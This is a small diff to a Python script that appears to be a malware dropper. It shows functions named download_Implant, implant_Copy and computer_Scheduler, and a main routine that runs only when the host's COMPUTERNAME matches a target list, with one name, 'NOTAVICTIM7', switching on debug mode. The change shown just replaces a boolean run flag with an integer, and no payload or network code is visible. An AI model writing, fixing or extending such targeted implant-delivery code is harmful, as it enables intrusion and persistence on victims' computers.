@@ -150,6 +150,8 @@ def computer_Scheduler():
     time.sleep(5)
 
 if __name__ == '__main__':
+    run = 0
+    
     try:
         print('''
 
@@ -196,7 +198,7 @@ if __name__ == '__main__':
             print ("Current test is " + i)
             if i == os.environ['COMPUTERNAME']:
                 print ("Computer Name is " + i)
-                run = True
+                run = 1
                 if i == 'NOTAVICTIM7':
                     debug = 1
                 else:
@@ -205,7 +207,7 @@ if __name__ == '__main__':
             else:
                 pass
 
-        if run == False:
+        if run == 0:
             sys.exit(1)
         download_Implant()
         implant_Copy()
